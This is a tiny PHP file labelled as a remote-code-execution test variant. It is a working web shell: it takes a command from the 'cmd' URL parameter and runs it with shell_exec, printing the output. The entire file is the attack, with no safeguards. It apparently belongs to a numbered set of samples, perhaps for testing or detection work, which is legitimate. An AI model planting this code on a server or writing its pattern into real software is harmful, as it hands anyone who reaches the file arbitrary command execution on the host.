<?php
// RCE test variation #735
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>